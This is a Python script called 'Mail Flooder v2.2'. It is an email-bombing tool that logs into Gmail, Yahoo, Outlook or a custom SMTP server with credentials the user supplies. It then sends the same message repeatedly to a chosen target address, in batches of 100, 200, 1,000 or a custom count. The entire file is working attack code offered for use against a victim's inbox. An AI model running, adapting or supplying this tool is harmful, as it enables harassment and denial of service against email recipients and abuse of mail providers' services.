import sys
import smtplib
import pyfiglet

class bcolors:
    BLUE = '"\033[34m"'
    YELLOW = '\033[93m'
    RED = '\033[31m'

def banner():
    print(bcolors.YELLOW + '***mail-Flooder v2.2***')
    print(bcolors.YELLOW + '***python***')
    banner = pyfiglet.figlet_format("Mail Flooder - by PRATIK")
    print(banner)


class Mail_Flooder:
    count = 0
    def __init__(self):
        try:
            print(bcolors.BLUE + '\n*** START FLOODING ***')
            self.target = str(input(bcolors.RED + 'Enter target email ::: '))
            self.level = int(input(bcolors.YELLOW + 'Enter FLOOD level (1,2,3,4) || 1 for (100) mail \n2 for 200 mail \n3 for (1000) mail \n4 for your custom \n enter the option::: '))
            if int(self.level) > int(4) or int(self.level) < int(1):
                print('ERROR: Invalid Option. GoodBye.')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')

    def FLOOD(self):
        try:
            print(bcolors.RED + '\n*** starting Flooder ***')
            self.amount = None
            if self.level == int(1):
                self.amount = int(100)
            elif self.level == int(2):
                self.amount = int(200)
            elif self.level == int(3):
                self.amount = int(1000)
            else:
                self.amount = int(input(bcolors.BLUE + 'custom number of mail You want to send :: '))
            print(bcolors.RED + f'\n*** You have selected FLOODER level: {self.level} and {self.amount} emails ***')
        except Exception as e:
            print(f'ERROR: {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n***[ Setting up email ***')
            self.server = str(input(bcolors.BLUE + 'Enter email server | or select premade options - 1:Gmail 2:Yahoo 3:Outlook ::: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.BLUE + 'Enter port number <: '))

            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            elif self.server == '3':
                self.server = 'smtp-mail.outlook.com'

            self.fromAddr = str(input(bcolors.BLUE + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.BLUE + 'Enter from password <: '))
            self.subject = str(input(bcolors.BLUE + 'Enter subject <: '))
            self.message = str(input(bcolors.BLUE + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.YELLOW + f'FLOOD: {self.count}')
        except Exception as e:
            print(f'ERROR: {e}')

    def attack(self):
        print(bcolors.RED + '\n*** FLOODING... ***')
        for email in range(self.amount+1):
            self.send()
        self.s.close()
        print(bcolors.RED + '\n*** FLOODING ***')
        sys.exit(0)


if __name__=='__main__':
    banner()
    FLOOD = Mail_Flooder()
    FLOOD.FLOOD()
    FLOOD.email()
    FLOOD.attack()
